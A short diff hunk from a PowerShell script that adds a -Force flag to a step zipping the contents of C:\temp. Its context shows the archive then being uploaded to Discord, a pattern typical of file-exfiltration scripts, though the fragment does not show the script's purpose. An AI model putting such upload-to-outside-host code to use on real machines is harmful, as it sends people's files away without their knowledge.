@@ -496,7 +496,7 @@ function DelTempDir {
         $zipFilePath = Join-Path "C:\" $zipFileName
 
         # Create a zip archive with the contents of C:\temp
-        Compress-Archive -Path "C:\temp\*" -DestinationPath $zipFilePath
+        Compress-Archive -Path "C:\temp\*" -DestinationPath $zipFilePath -Force
 
         # Upload the zip archive to Discord
         Upload-Discord -file $zipFilePath -text "Temporary Directory Archive: $zipFileName"
